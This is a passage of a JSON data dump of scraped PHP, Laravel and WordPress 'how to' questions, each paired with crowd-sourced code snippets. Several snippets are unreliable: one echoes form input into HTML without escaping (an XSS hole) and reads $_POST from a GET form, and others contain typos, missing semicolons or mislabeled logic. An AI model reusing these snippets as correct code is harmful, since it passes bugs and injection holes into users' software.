    "description": "/** This code may be used in functions.php, wp-config.php, or used to create an mu-plugin * The purpose of the code is to remove all the anoying popups in WordPress */  add_action('admin_enqueue_scripts', 'ds_admin_theme_style'); add_action('login_enqueue_scripts', 'ds_admin_theme_style'); function ds_admin_theme_style() { \tif (!current_user_can( 'manage_options' )) { \t\techo '<style>.update-nag, .updated, .error, .is-dismissible { display: none; }</style>'; \t} }\n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1715,
    "keyword": null,
    "link": null,
    "title": " how to remove array index from json in php",
    "description": "<?php  // numeric array keys with no gaps $a = ['a', 'b', 'c']; echo json_encode($a); // [\"a\",\"b\",\"c\"]  // filter out the 'b' element to introduce a gap in the keys $a = array_filter($a, function ($v) {     return $v !== 'b'; }); echo json_encode($a); // {\"0\":\"a\",\"2\":\"c\"}  // re-index the array to remove gaps $a = array_values($a); echo json_encode($a); // [\"a\",\"c\"]\n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1716,
    "keyword": null,
    "link": null,
    "title": " how to remove composer package in laravel",
    "description": "composer remove vendor/package\ncomposer remove <package> eg: composer remove laravel/tinker \ncomposer remove vendor/package \n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1717,
    "keyword": null,
    "link": null,
    "title": " how to remove duplicate values from a multidimensional array in php",
    "description": "<?php $fruits_list = array('Orange',  'Apple', ' Banana', 'Cherry', ' Banana'); $result = array_unique($fruits_list); print_r($result); ?>    Output:  Array ( [0] => Orange [1] => Apple [2] => Banana [3] => Cherry ) \n<?php     function super_unique($array,$key)     {        $temp_array = [];        foreach ($array as &$v) {            if (!isset($temp_array[$v[$key]]))            $temp_array[$v[$key]] =& $v;        }        $array = array_values($temp_array);        return $array;      }   $arr=\"\"; $arr[0]['id']=0; $arr[0]['titel']=\"ABC\"; $arr[1]['id']=1; $arr[1]['titel']=\"DEF\"; $arr[2]['id']=2; $arr[2]['titel']=\"ABC\"; $arr[3]['id']=3; $arr[3]['titel']=\"XYZ\";  echo \"<pre>\"; print_r($arr); echo \"unique*********************<br/>\"; print_r(super_unique($arr,'titel'));  ?> \n<?php $a=array(\"a\"=>\"red\",\"b\"=>\"green\",\"c\"=>\"red\"); print_r(array_unique($a)); ?> Output : Array ( [a] => red [b] => green )  Example 2:   $array = array(1, 2, 2, 3); $array = array_unique($array);  Output : Array is now (1, 2, 3)      \nWe used this to de-duplicate results from a variety of overlapping queries.  $input = array_map(\"unserialize\", array_unique(array_map(\"serialize\", $input))); \n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1718,
    "keyword": null,
    "link": null,
    "title": " how to remove duplicate values from an array in php",
    "description": "<?php $fruits_list = array('Orange',  'Apple', ' Banana', 'Cherry', ' Banana'); $result = array_unique($fruits_list); print_r($result); ?>    Output:  Array ( [0] => Orange [1] => Apple [2] => Banana [3] => Cherry ) \n<?php $input = array(\"a\" => \"green\", \"red\", \"b\" => \"green\", \"blue\", \"red\"); $result = array_unique($input); print_r($result); ?>  Array (     [a] => green     [0] => red     [1] => blue )\nlet chars = ['A', 'B', 'A', 'C', 'B']; let uniqueChars = [...new Set(chars)];  console.log(uniqueChars); \n$str = implode(',',array_unique(explode(',', $str)));\n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1719,
    "keyword": null,
    "link": null,
    "title": " how to remove first element in array php",
    "description": "<?php $stack = array(\"orange\", \"banana\", \"apple\", \"raspberry\"); $fruit = array_shift($stack); print_r($stack); ?>   // Array // ( //     [0] => banana //     [1] => apple //     [2] => raspberry // )\n$arr = [1,2,3,4]; array_shift($arr); print_r($arr); // [2,3,4]\n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1720,
    "keyword": null,
    "link": null,
    "title": " how to remove index.php from yii2 and apache2",
    "description": "#paste this in your terminal sudo a2enmod rewrite sudo service apache2 restart   #add the line below to /etc/apache2/sites-enabled/000-default.conf  <Directory /var/www/html>    AllowOverride All </Directory>  #create file .htaccess within web dir, paste the lines below into the file  <IfModule mod_rewrite.c>   RewriteEngine On   RewriteBase /   RewriteRule ^index\\.php$ - [L]   RewriteCond %{REQUEST_FILENAME} !-f   RewriteCond %{REQUEST_FILENAME} !-d   RewriteRule . /index.php [L] </IfModule>  \n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1721,
    "keyword": null,
    "link": null,
    "title": " how to remove index.php in codeigniter",
    "description": "<?php  #By default, the index.php file will be included in your URLs:    # Create a .htaccess file in your root folder and paste the below code  RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] ?>\n1. Change $config['index_page'] = \"index.php\" to $config['index_page'] = \"\" in config.php 2. Change $config['uri_protocol'] =\"AUTO\" to $config['uri_protocol'] = \"REQUEST_URI\" in config.php 3. Create .htaccess file in root dir of your application and paste the following code   \tRewriteEngine on \tRewriteCond $1 !^(index\\.php|resources|robots\\.txt) \tRewriteCond %{REQUEST_FILENAME} !-f \tRewriteCond %{REQUEST_FILENAME} !-d \tRewriteRule ^(.*)$ index.php/$1 [L,QSA]  \n#in apache mod rewrite is disabled a2enmod rewrite\nRewriteEngine on RewriteCond $1 !^(index\\.php|resources|robots\\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA] \n# Only for Nginx server location / {     try_files $uri $uri/ /index.php$is_args$args; }\nRewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L]\n",
    "reg_date": "2021-10-12T10:14:59.000Z"
  },
  {
    "id": 1722,
    "keyword": null,
    "link": null,
    "title": " how to remove keys in subarray php",
    "description": "print_r(deep_delete_keys($arr,'country'));  function deep_delete_keys($arr, $keys) {     if (!is_array($keys)) $keys = array($keys);     $filteredArr = array_diff_key( $arr, array_flip( $keys ) );     foreach ($filteredArr as &$val) {         if (is_array($val)) {             $val = deep_delete_keys($val, $keys);         }     }     return $filteredArr; }\n",
    "reg_date": "2021-10-12T10:14:59.000Z"
  },
  {
    "id": 1723,
    "keyword": null,
    "link": null,
    "title": " how to remove notice error in php",
    "description": "ini_set('display_errors', 0); ini_set('display_startup_errors', 0);\n",
    "reg_date": "2021-10-12T10:14:59.000Z"
  },
  {
    "id": 1724,
    "keyword": null,
    "link": null,
    "title": " how to remove public from url in laravel",
    "description": "RewriteEngine On  RewriteCond %{REQUEST_FILENAME} -d [OR] RewriteCond %{REQUEST_FILENAME} -f RewriteRule ^ ^$1 [N]  RewriteCond %{REQUEST_URI} (\\.\\w+$) [NC] RewriteRule ^(.*)$ public/$1   RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ server.php\nRename server.php in your Laravel root folder to index.php Copy the .htaccess file from /public directory to your Laravel root folder.\nRewriteEngine On RewriteCond %{REQUEST_URI} !^/public/ RewriteRule ^(.*)$ /public/$1 [L,QSA]\n",
    "reg_date": "2021-10-12T10:14:59.000Z"
  },
  {
    "id": 1725,
    "keyword": null,
    "link": null,
    "title": " how to remove public from url in laravel 8",
    "description": "RewriteEngine On  RewriteCond %{REQUEST_FILENAME} -d [OR] RewriteCond %{REQUEST_FILENAME} -f RewriteRule ^ ^$1 [N]  RewriteCond %{REQUEST_URI} (\\.\\w+$) [NC] RewriteRule ^(.*)$ public/$1   RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ server.php\nRewriteEngine On RewriteCond %{REQUEST_URI} !^/public/ RewriteRule ^(.*)$ /public/$1 [L,QSA]\n",
    "reg_date": "2021-10-12T10:14:59.000Z"
  },
  {
    "id": 1726,
    "keyword": null,
    "link": null,
    "title": " how to replace double quotes in a string in php",
    "description": "to replace double quotes, you can do this: $newPhrase = str_replace('\"', '', $phrase);\n",
    "reg_date": "2021-10-12T10:14:59.000Z"
  },
  {
    "id": 1727,
    "keyword": null,
    "link": null,
    "title": " how to replace multiple characters in a string in php",
    "description": "// Provides: You should eat pizza, beer, and ice cream every day $phrase  = \"You should eat fruits, vegetables, and fiber every day.\"; $healthy = [\"fruits\", \"vegetables\", \"fiber\"]; $yummy   = [\"pizza\", \"beer\", \"ice cream\"];  $newPhrase = str_replace($healthy, $yummy, $phrase);\nto replace double quotes, you can do this: $newPhrase = str_replace('\"', '', $phrase);\n",
    "reg_date": "2021-10-12T10:14:59.000Z"
  },
  {
    "id": 1728,
    "keyword": null,
    "link": null,
    "title": " how to request user input in php",
    "description": "<?php echo \"What do you want to input? \"; $input = rtrim(fgets(STDIN)); echo \"I got it:\\n\" . $input; \n",
    "reg_date": "2021-10-12T10:14:59.000Z"
  },
  {
    "id": 1729,
    "keyword": null,
    "link": null,
    "title": " how to restart php-fpm on ubuntu",
    "description": "service php-fpm restart    # typical service php5-fpm restart   # debian-style service php7.0-fpm restart # debian-style PHP 7 service php7.2-fpm restart # debian-style PHP 7.2 service php7.4-fpm restart # debian-style PHP 7.4 \nsudo /etc/init.d/php-fpm restart\n",
    "reg_date": "2021-10-12T10:15:00.000Z"
  },
  {
    "id": 1730,
    "keyword": null,
    "link": null,
    "title": " how to retrieve value from stdclass array in php",
    "description": "foreach ($array as $obj) {     // Here you can access to every object value in the way that you want     echo $obj->next_key_name; }\n",
    "reg_date": "2021-10-12T10:15:00.000Z"
  },
  {
    "id": 1731,
    "keyword": null,
    "link": null,
    "title": " how to return chunk data laravel",
    "description": "$count = 0; DB::table('users')->chunk(200, function($users) use (&$count) {     Log::debug(count($users)); // will log the current iterations count     $count = $count + count($users); // will write the total count to our method var }); Log::debug($count); // will log the total count of records\n",
    "reg_date": "2021-10-12T10:15:00.000Z"
  },
  {
    "id": 1732,
    "keyword": null,
    "link": null,
    "title": " how to return with open model popup in laravel",
    "description": "//pass back a variable when redirecting return Redirect::back()->with('error_code', 5);  //in blade tempalte @if(!empty(Session::get('error_code')) && Session::get('error_code') == 5) <script> $(function() {     $('#myModal').modal('show'); }); </script> @endif    //second seneario use like this   <script type=\"text/javascript\">     @if(!empty(Session::get('error_code')))         <?php $a = Session::get('error_code'); ?>         $('#updateCarModel{{ $a }}').modal('show');         console.log(\"#updateCarModel{{ $a }}\");     @endif </script> //@sujay\n",
    "reg_date": "2021-10-12T10:15:00.000Z"
  },
  {
    "id": 1733,
    "keyword": null,
    "link": null,
    "title": " how to run a specific migration in laravel",
    "description": "php artisan migrate --path=/database/migrations/my_migration.php\nphp artisan migrate:refresh --path=/database/migrations/2021_06_23_093317_create_users_table.php\n* To run a specific migration  php artisan migrate:refresh --path=/database/migrations/2019_03_23_165757_create_combined_1553343771_users_table.php    - Note: it will drop the table and create a new one.  \nphp artisan migrate:refresh  --path=/database/migrations/2014_10_12_000000_create_users_table.php\n",
    "reg_date": "2021-10-12T10:15:00.000Z"
  },
  {
    "id": 1734,
    "keyword": null,
    "link": null,
    "title": " how to run laravel project",
    "description": "The full command works like this:  php artisan serve --host=<host IP address> --port=<port to use>  php artisan serve --host=127.0.0.1 --port=8080\n     Create a database locally named homestead utf8_general_ci     Download composer https://getcomposer.org/download/     Pull Laravel/php project from git provider.     Rename .env.example file to .envinside your project root and fill the database information. (windows wont let you do it, so you have to open your console cd your project root directory and run mv .env.example .env )     Open the console and cd your project root directory     Run composer install or php composer.phar install     Run php artisan key:generate     Run php artisan migrate     Run php artisan db:seed to run seeders, if any.     Run php artisan serve  #####You can now access yo  ur project at localhost:8000 :) \n// To install and use a specific version, you can enter it at the end of the command. // For example using version 5.8 ==> composer create-project --prefer-dist laravel/laravel projectName \"5.8.*\"\n// run laravel project  php artisan serve --port=\"port\" --host=\"host\"\nphp artisan serve   /*  To START composer in project folder on MacOS:    The original answer is:    The full command works like this:  php artisan serve --host=<host IP address> --port=<port to use>  php artisan serve --host=127.0.0.1 --port=8080 AFTER: php artisan serve TERMINAL SHOWS: Laravel development server started: <http://127.0.0.1:8000>  IN WEB BROWSER ENTER THE: http://127.0.0.1:8000 , OR: http://localhost:8000/ AND YOU ARE IN ! ! !   */ http://127.0.0.1:8000/ http://localhost:8000/\n 1. composer update --no-scripts  or composer install  2. php artisan key:generate   3. rename example.env to .env  4. Change database credentials, set debug mode! Change app url  4. php artisan migrate(make sure u have the database running in the server)  5. php artisan config:clear  6. you are good to go! \n",
    "reg_date": "2021-10-12T10:15:00.000Z"
  },
  {
    "id": 1735,
    "keyword": null,
    "link": null,
    "title": " how to run laravel project in xampp",
    "description": "Install XAMPP Install composer(You can download composer from https://getcomposer.org/download/) Open cmd(make sure your path is the same as C:\\xampp\\htdocs>) then Install laravel GLOBALLY by the command: composer global require laravel/installer Now hit the command: laravel new your-projectname Your project is created now to run the project use command: php artisan serve The URL will be displayed on cmd, copy and use that URL in a browser you can see your laravel project                   /*If you have a ready project and you want to run with XAMPP*/ if your laravel project is ready then put a laravel project folder at htdocs(unzip if it's .zip file) Create a database(you can see database name in .env file) then select the created database and import the .sql file(if .sql file is not provided then you have to create an entire database). Now your project is ready to run. Start the Apache and MySQL from XAMPP then hit the php artisan serve command in cmd(make sure your cmd is opened with the same path as your project).  \n",
    "reg_date": "2021-10-12T10:15:00.000Z"
  },
  {
    "id": 1736,
    "keyword": null,
    "link": null,
    "title": " how to run multiple laravel projects at same time",
    "description": "php artisan serve --port=8001 \n",
    "reg_date": "2021-10-12T10:15:00.000Z"
  },
  {
    "id": 1737,
    "keyword": null,
    "link": null,
    "title": " how to run specific seeder in laravel",
    "description": "#All of them php artisan db:seed #One class php artisan db:seed --class=UserSeeder\nphp artisan db:seed --class=UserSeeder\nphp artisan db:seed --class=NameOfSeeder\nphp artisan migrate:fresh --seed\n<?php  use Illuminate\\Database\\Seeder; use Illuminate\\Support\\Facades\\DB; use Illuminate\\Support\\Facades\\Hash; use Illuminate\\Support\\Str;  class DatabaseSeeder extends Seeder {     /**      * Run the database seeds.      *      * @return void      */     public function run()     {         DB::table('users')->insert([             'name' => Str::random(10),             'email' => Str::random(10).'@gmail.com',             'password' => Hash::make('password'),         ]);     } }\n$ php artisan db:seed --class=ArticlesTableSeeder \n",
    "reg_date": "2021-10-12T10:15:00.000Z"
  },
  {
    "id": 1738,
    "keyword": null,
    "link": null,
    "title": " how to save data from api to laravel",
    "description": "$res = $gallery->request('GET','https://www.instagram.com/explore/tags/MIZONEDanceBattle/?__a=1');     $data = json_decode($res->getBody()->getContents(), true);      $gallery = Gallery::firtsOrCreate([             'shortcode',             'thumbnail_src',         ], $data]); // add $data here     $gallery->save(); \n",
    "reg_date": "2021-10-12T10:15:01.000Z"
  },
  {
    "id": 1739,
    "keyword": null,
    "link": null,
    "title": " how to save information on pdf file in laravel project",
    "description": "$pdf = PDF::loadView('pdf.invoice', $data);  Storage::put('public/pdf/invoice.pdf', $pdf->output());  return $pdf->download('invoice.pdf'); \n",
    "reg_date": "2021-10-12T10:15:01.000Z"
  },
  {
    "id": 1740,
    "keyword": null,
    "link": null,
    "title": " how to search google php",
    "description": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\"> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <link href='http://fonts.googleapis.com/css?family=Yanone+Kaffeesatz' rel='stylesheet' type='text/css'> <title>Google Search Results using PHP</title> </head>  <body style=\"margin-left:20px;\">  <h1 style=\"font-family: 'Yanone Kaffeesatz', arial, serif;\">This is a demo page which demonstrates how to print out Google Search Results using PHP</h1> <h2 style=\"font-family: 'Yanone Kaffeesatz', arial, serif;\">To view this tutorial go to <a href=\"#\" target=\"_blank\">Google Search Results using PHP</a></h2>   <label>Enter your search criteria here:</label> <form method=\"get\" action=\"\"> <input name=\"results\" /> <input type=\"submit\" /> </form>   <?php  $search = $_GET['results']; if(isset($_GET['results']) && $_GET['results'] != \"\") \t{ \t\t \t\techo \"<br />Your Search Result Array:<br /><br />\"; \t \t$url = \"http://ajax.googleapis.com/ajax/services/search/web?v=1.0&\" \t\t. \"q=\".str_replace(' ', ' ', $_GET['results']); \t \t// sendRequest \t// note how referer is set manually \t$ch = curl_init(); \tcurl_setopt($ch, CURLOPT_URL, $url); \tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); \tcurl_setopt($ch, CURLOPT_REFERER, 'http://www.google.com'); \t$body = curl_exec($ch); \tcurl_close($ch); \t \t// now, process the JSON string \t$json = json_decode($body); \t \t// print out the Array \tprint_r($json); \t \t// now have some fun with the results... }  ?>  </body> </html>  \n",
    "reg_date": "2021-10-12T10:15:01.000Z"
  },
  {
    "id": 1741,
    "keyword": null,
    "link": null,
    "title": " how to see php error log",
    "description": "/usr/local/apache/logs/error_log\n",
    "reg_date": "2021-10-12T10:15:01.000Z"
  },
  {
    "id": 1742,
    "keyword": null,
    "link": null,
    "title": " how to send data from html to php",
    "description": "<form action=\"welcome_get.php\" method=\"get\"> Name: <input type=\"text\" name=\"name\"><br> E-mail: <input type=\"text\" name=\"email\"><br> <input type=\"submit\"> </form> // in welcome_get.php: Welcome <?php echo $_POST[\"name\"]; ?><br> Your email address is: <?php echo $_POST[\"email\"]; ?>\n",
    "reg_date": "2021-10-12T10:15:01.000Z"
  },
  {
    "id": 1743,
    "keyword": null,
    "link": null,
    "title": " how to send post variables in header php",
    "description": "<form name=\"myform\" action=\"\" method=\"post\">  <p>Name</p> <input type=\"text\" name=\"name\" value=\"\" /> <span class=\"warning\"><?php if (isset($errors['name'])) echo $errors['name']; ?> </span>  <p>Employer</p> <input type=\"text\" name=\"employer\" value=\"\" /> <span class=\"warning\"><?php if (isset($errors['employer'])) echo $errors['employer']; ?> </span>  <input name=\"somename\" type=\"hidden\" value=\"somevalue\"/> <input type=\"submit\" value=\"send\"> </form> \n",
    "reg_date": "2021-10-12T10:15:01.000Z"
  },
  {
    "id": 1744,
    "keyword": null,
    "link": null,
    "title": " how to separate integer from string in php",
    "description": " phpCopy<?php  $string = 'Sarah has 4_dolls  8_dolls and 6 bunnies.'; $int = (int) filter_var($string, FILTER_SANITIZE_NUMBER_INT);   echo(\"The extracted numbers are: $int \\n\");  ?>  \n",
    "reg_date": "2021-10-12T10:15:01.000Z"
  },
  {
    "id": 1745,
    "keyword": null,
    "link": null,
    "title": " how to serve the port in php",
    "description": "php artisan serve --port=portNumber  // Example with port php artisan serve --port=8001    // Note: You May choose anyport you want\n",
    "reg_date": "2021-10-12T10:15:02.000Z"
  },
  {
    "id": 1746,
    "keyword": null,
    "link": null,
    "title": " how to set a validation on a value if its not null in laravel php",
    "description": "'password' => 'nullable|min:6|confirmed',\n",
    "reg_date": "2021-10-12T10:15:02.000Z"
  },
  {
    "id": 1747,
    "keyword": null,
    "link": null,
    "title": " how to set application key in lumen",
    "description": "$router->get('/key', function() {     return \\Illuminate\\Support\\Str::random(32); });\n",
    "reg_date": "2021-10-12T10:15:02.000Z"
  },
  {
    "id": 1748,
    "keyword": null,
    "link": null,
    "title": " how to set countdown timer in php demo",
    "description": "<script type=\"text/javascript\" src=\"jquery-1.6.2.min.js\"></script>  <h1 align=\"center\" style=\"color:green\">A countdown timer in jquery</h1>  <h3 style=\"color:#FF0000\" align=\"center\">  You will be logged out in : <span id='timer'></span>  </h3>  <script> \t//define your time in second \t\tvar c=60;         var t;         timedCount();          function timedCount() \t\t{          \tvar hours = parseInt( c / 3600 ) % 24;         \tvar minutes = parseInt( c / 60 ) % 60;         \tvar seconds = c % 60;          \tvar result = (hours < 10 ? \"0\" + hours : hours) + \":\" + (minutes < 10 ? \"0\" + minutes : minutes) + \":\" + (seconds  < 10 ? \"0\" + seconds : seconds);                       \t$('#timer').html(result);             if(c == 0 ) \t\t\t{             \t//setConfirmUnload(false);                 //$(\"#quiz_form\").submit(); \t\t\t\twindow.location=\"logout.html\"; \t\t\t}             c = c - 1;             t = setTimeout(function() \t\t\t{ \t\t\t timedCount() \t\t\t}, \t\t\t1000);         } \t</script> \n",
    "reg_date": "2021-10-12T10:15:02.000Z"
  },
  {
    "id": 1749,
    "keyword": null,
    "link": null,
    "title": " how to set date in php",
    "description": "<?php $str = 'Tue Dec 15 2009'; $timestamp = strtotime($str); echo $timestamp; //output: 1260831600 ?>\n// 1. create a date instance $date = new DateTime;  // 2. set the date using the setDate(year, month, date) method on the //    $date instance $date->setDate(1999,02,19);\n",
    "reg_date": "2021-10-12T10:15:02.000Z"
  },
  {
    "id": 1750,
    "keyword": null,
    "link": null,
    "title": " how to set field type of date of birth in laravel",
    "description": "$table->date('date_of_birth'); \n",
    "reg_date": "2021-10-12T10:15:02.000Z"
  },
  {
    "id": 1751,
    "keyword": null,
    "link": null,
    "title": " how to set ist in php",
    "description": "date_default_timezone_set('Asia/Kolkata'); \n",
    "reg_date": "2021-10-12T10:15:02.000Z"
  },
  {
    "id": 1752,
    "keyword": null,
    "link": null,
    "title": " how to set no cache header php",
    "description": "header(\"Content-Type: application/json\"); header(\"Expires: on, 01 Jan 1970 00:00:00 GMT\"); header(\"Last-Modified: \" . gmdate(\"D, d M Y H:i:s\") . \" GMT\"); header(\"Cache-Control: no-store, no-cache, must-revalidate\"); header(\"Cache-Control: post-check=0, pre-check=0\", false); header(\"Pragma: no-cache\");\n",
    "reg_date": "2021-10-12T10:15:03.000Z"
  },
  {
    "id": 1753,
    "keyword": null,
    "link": null,
    "title": " how to set up alert messages in laravel 8",
    "description": "integration de sweet alert avec laravel <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.2.0/sweetalert2.min.css\"> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.2.0/sweetalert2.all.min.js\"></script>\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.2.0/sweetalert2.min.css\"> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.2.0/sweetalert2.all.min.js\"></script> \n",
    "reg_date": "2021-10-12T10:15:03.000Z"
  },
  {
    "id": 1754,
    "keyword": null,
    "link": null,
    "title": " how to setup cronjob on cakephp on share hosting",
    "description": "/home/u280xxxxxx/domains/win.domainname.club/public_html/Console/cake Hello production   // /home/username/domains/full_domain_name/public_html/Console/cake CronjobName production\ncrontab -l; -> get all current crontab in system crontab -e -> execute cronjob  // Example // At 12:00 evening run on time 0 12 * * * cd /Applications/XAMPP/htdocs/masterx && Console/cake LessonRemindNotification staging  // 1 minutes run one times /1 * * * * cd /Applications/XAMPP/htdocs/masterx && Console/cake ExecutePush staging /1 * * * * cd /Applications/XAMPP/htdocs/masterx && Console/cake UpdateClassStatus staging  // At 5:00 morning run one time 0 5 * * * cd /Applications/XAMPP/htdocs/masterx && Console/cake UpdateClassStatusAddStudentStampPaidTeacher staging  // At 1:00 morning run one time 0 1 * * * cd /Applications/XAMPP/htdocs/masterx && Console/cake UpdateStudentEnrolTimeoutStatus staging 0 1 * * * cd /Applications/XAMPP/htdocs/masterx && Console/cake UpdateTeacherPurchasePlanTimeoutStatus staging \n",
    "reg_date": "2021-10-12T10:15:03.000Z"
  },
  {
    "id": 1755,
    "keyword": null,
    "link": null,
    "title": " how to share a helper globally laravel",
    "description": "php artisan make:provider HelperServiceProvider \nrequire_once app_path('Helpers/AnythingHelper.php'); \n'App\\Providers\\HelperServiceProvider', \n<?php function getDomesticCities() { $result = \\App\\Package::where('type', '=', 'domestic')     ->groupBy('from_city')     ->get(['from_city']);  return $result; } \n",
    "reg_date": "2021-10-12T10:15:03.000Z"
  },
  {
    "id": 1756,
    "keyword": null,
    "link": null,
    "title": " how to show validation error in laravel blade",
    "description": "@if($errors->any())     <div class=\"alert alert-danger\">         <p><strong>Opps Something went wrong</strong></p>         <ul>         @foreach ($errors->all() as $error)             <li>{{ $error }}</li>         @endforeach         </ul>     </div> @endif  @if(session('success'))     <div class=\"alert alert-success\">{{session('success')}}</div> @endif  @if(session('error'))     <div class=\"alert alert-danger\">{{session('error')}}</div> @endif \n@if($errors->has())    @foreach ($errors->all() as $error)       <div>{{ $error }}</div>   @endforeach @endif\npublic function store(Request $request) {     $validator = Validator::make($request->all(), [         'title' => 'bail|required|max:255',         'body' => 'required',     ]);      // Check validation failure     if ($validator->fails()) {        // [...]              foreach($validator->messages()->getMessages() as $field_name => $messages) {                  // Go through each message for this field.                 foreach($messages AS $message) {                     echo '***********'.$message.'***********<br>';                 }             }     }      // Check validation success     if ($validator->passes()) {        // [...]     }      // Retrieve errors message bag     $errors = $validator->errors(); }\n@if($errors->any())     {{ implode('', $errors->all('<div>:message</div>')) }} @endif\n<!-- /resources/views/post/create.blade.php -->  <h1>Create Post</h1>  @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif  <!-- Create Post Form -->\n",
    "reg_date": "2021-10-12T10:15:03.000Z"
  },
  {
    "id": 1757,
    "keyword": null,
    "link": null,
    "title": " how to solve php mysqli query function problem does not execute",
    "description": "<?php $con = mysqli_connect(\"localhost\", \"root\", \"\", \"test\"); if (mysqli_connect_errno()) {   printf(\"Connect failed: %s\\n\", mysqli_connect_error());   exit(); }  $query = \"INSERT INTO files VALUES (NULL, 5, 'hello')\"; echo \"<pre>Debug: $query</pre>\\m\"; $result = mysqli_query($con, $query); if ( false===$result ) {   printf(\"error: %s\\n\", mysqli_error($con)); } else {   echo 'done.'; }\n",
    "reg_date": "2021-10-12T10:15:03.000Z"
  },
  {
    "id": 1758,
    "keyword": null,
    "link": null,
    "title": " how to split url in php",
    "description": "<?php $url = 'http://www.example.com/news?q=string&f=true&id=1233&sort=true';  $values = parse_url($url);  $host = explode('.',$values['host']);  echo $host[1];  ?> \n",
    "reg_date": "2021-10-12T10:15:03.000Z"
  },
  {
    "id": 1759,
    "keyword": null,
    "link": null,
    "title": " how to start a session",
    "description": "<?php  session_start(); //starts session session_unset(); // remove all session variables session_destroy(); // destroy the session ?>   \n",
    "reg_date": "2021-10-12T10:15:03.000Z"
  },
  {
    "id": 1760,
    "keyword": null,
    "link": null,
    "title": " how to start composer in laravel project on localhost",
    "description": "The full command works like this:  php artisan serve --host=<host IP address> --port=<port to use>  php artisan serve --host=127.0.0.1 --port=8080\nphp artisan serve   /*  To START composer in project folder on MacOS:    The original answer is:    The full command works like this:  php artisan serve --host=<host IP address> --port=<port to use>  php artisan serve --host=127.0.0.1 --port=8080 AFTER: php artisan serve TERMINAL SHOWS: Laravel development server started: <http://127.0.0.1:8000>  IN WEB BROWSER ENTER THE: http://127.0.0.1:8000 , OR: http://localhost:8000/ AND YOU ARE IN ! ! !   */ http://127.0.0.1:8000/ http://localhost:8000/\nphp artisan serve   // The original answer is:   /*    The full command works like this:  php artisan serve --host=<host IP address> --port=<port to use>  php artisan serve --host=127.0.0.1 --port=8080   */\n",
    "reg_date": "2021-10-12T10:15:03.000Z"
  },
  {
    "id": 1761,
    "keyword": null,
    "link": null,
    "title": " how to store an image in laravel directly from url",
    "description": "use Storage; $url = \"http://www.google.co.in/intl/en_com/images/srpr/logo1w.png\"; $contents = file_get_contents($url); $name = substr($url, strrpos($url, '/') + 1); Storage::put($name, $contents); \n",
    "reg_date": "2021-10-12T10:15:04.000Z"
  },
  {
    "id": 1762,
    "keyword": null,
    "link": null,
    "title": " how to store data with php",
    "description": "<?php     //Get a secure filename so no one can get your server files     $username = \"myUsername\"     $filename = uniqid($username, true).\".csv\"; \t//You can change the .csv file to a .txt      //Create the array that stores data. You can replace what is below with what you want     $userInfo = [\"username\" => $username, \"points\" => 0];      // Store the data     file_put_contents($filename, serialize($userInfo));      // How to get the data     $userInfo = unserialize(file_get_contents($filename));     print($userInfo[\"points\"]);     // or     print($userInfo[\"username\"]); \t//Make sure that ^^^^ matches what is in the array ?>\n",
    "reg_date": "2021-10-12T10:15:04.000Z"
  },
  {
    "id": 1763,
    "keyword": null,
    "link": null,
    "title": " how to store value in session using javascript in php",
    "description": "$(document).ready(function(){ $('.button').click(function(){var href = $(this).val();$.session.set(\"yoursessioname\", \"storevalue\");}) }); alert($.session.get(\"yoursessioname\"));\n",
    "reg_date": "2021-10-12T10:15:04.000Z"
  },
  {
    "id": 1764,
    "keyword": null,
    "link": null,
    "title": " how to style echo in php",
    "description": "You can style it by the following way:  echo \"<p style='color:red;'>\" . $ip['cityName'] . \"</p>\"; echo \"<p style='color:red;'>\" . $ip['countryName'] . \"</p>\";\n",
    "reg_date": "2021-10-12T10:15:04.000Z"
  },
  {
    "id": 1765,
    "keyword": null,
    "link": null,
    "title": " how to trim white space array in php",
    "description": "$fruit = array('  apple ','banana   ', ' , ',     '            cranberry '); $trimmed_array = array_map('trim', $fruit); print_r($trimmed_array);\n$string = preg_replace('/\\s+/', '', $string);\n",
    "reg_date": "2021-10-12T10:15:04.000Z"
  },
  {
    "id": 1766,
    "keyword": null,
    "link": null,
    "title": " how to truncate the given string to the specified length in blade.php",
    "description": "{{Str::limit($category->name, 20)}}  if to end     {{Str::limit($category->name, 20, $end='.......')}}               or    {{\\Illuminate\\Support\\Str::limit($category->name, 20)}}            \n#insert this line in blade.php it will truncate your string #first parameter accept the string to be truncate  #second parameter accept the lenght  $third accept waht should print after the truncate string {{ \\Illuminate\\Support\\Str::limit($string, 150, $end='...') }}\n",
    "reg_date": "2021-10-12T10:15:04.000Z"
  },
  {
    "id": 1767,
    "keyword": null,
    "link": null,
    "title": " how to uninstall php from mac catalina completely",
